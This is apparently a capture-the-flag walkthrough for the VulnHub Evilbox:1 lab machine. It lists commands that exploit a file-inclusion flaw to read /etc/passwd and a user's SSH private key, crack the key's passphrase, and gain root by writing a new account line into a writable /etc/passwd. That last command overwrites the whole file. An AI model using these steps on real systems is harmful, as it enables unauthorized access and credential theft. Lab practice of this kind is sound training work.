

# Evilbox:1 Walkthrough

**VulnHub Link:** [Evilbox:1](https://www.vulnhub.com/entry/evilbox-one,736/)
**Difficulty:** Easy
**Release Date:** 16 Aug 2021


## 1.Reconnaissance

nmap -A -O -T4 -P -sV 192.168.100.170

## 2.Web Enumeration

dirb http://192.168.100.170

we found /secret/evil.php

```bash
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt http://192.168.100.170/secret/evil.php?command=/etc/passwd
```

mowree user found
```bash
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt http://192.168.100.170/secret/evil.php?command=/home/mowree/.ssh/id_rsa
```

we obtain ssh private key
```bash
ssh2john id_rsa > id_rsa.hash
```
john id_rsa.hash  --wordlist=/usr/share/wordlists/rockyou.txt

unicorn passphrase found
```bash
ssh -i id_rsa mowree@192.168.100.170
```
mowree shell opened

user flag found

we download and use linpeas 

and observe that passwd file can be writable

in our machine ---> 
```bash
openssl passwd test
```
copy that and edit it as

toor:$1$haSDMQjd$jQEk6B.vo1s.Z60eq/hXG/:0:0:root:/root:/bin/bash 

in attack machine
```bash
echo 'toor:$1$haSDMQjd$jQEk6B.vo1s.Z60eq/hXG/:0:0:root:/root:/bin/bash' > /etc/passwd
```
su toor 
(password test)

and BOOOMM . Root flag captured..!

